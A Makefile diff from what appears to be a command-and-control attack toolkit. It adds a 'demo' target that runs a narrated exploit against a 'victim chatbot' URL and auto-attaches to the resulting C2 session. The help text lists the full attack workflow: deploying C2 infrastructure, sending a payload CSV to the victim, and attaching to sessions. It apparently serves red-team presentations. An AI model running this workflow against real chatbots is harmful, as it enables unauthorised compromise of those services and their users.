@@ -82,6 +82,20 @@ exploit:
 		uv run c2 exploit; \
 	fi
 
+# Demo: narrated exploit + auto-attach
+# Usage: make demo (reads ../.victim_url) or make demo TARGET=https://victim-chatbot.com
+demo:
+	@if [ -n "$(TARGET)" ]; then \
+		uv run c2 exploit $(TARGET) --narrate; \
+	else \
+		uv run c2 exploit --narrate; \
+	fi
+	@echo ""
+	@echo "Attaching to session..."
+	@if [ -f .session_id ]; then \
+		uv run c2 attach $$(cat .session_id); \
+	fi
+
 # Attack a target (sends CSV to victim, does not generate)
 # Usage: make attack TARGET=https://victim-chatbot.com
 attack:
@@ -216,6 +230,7 @@ help:
 	@echo "  make deploy             Deploy C2 infrastructure"
 	@echo ""
 	@echo "Attack Workflow:"
+	@echo "  make demo               Narrated exploit + auto-attach (for presentations)"
 	@echo "  make exploit            Generate payload + send to victim (reads .victim_url)"
 	@echo "  make exploit TARGET=url Override victim URL"
 	@echo "  make connect-session    Attach to C2 session interactively"
@@ -241,6 +256,6 @@ help:
 	@echo ""
 
 .PHONY: setup terraform-init terraform-plan terraform-apply terraform-destroy \
-        deploy terraform-yolo configure-ec2 exploit attack generate-csv send receive \
+        deploy terraform-yolo configure-ec2 demo exploit attack generate-csv send receive \
         connect-session attach operator status sessions debug logs check-dns update-dns \
         test verify-protocol clean destroy help env-from-terraform
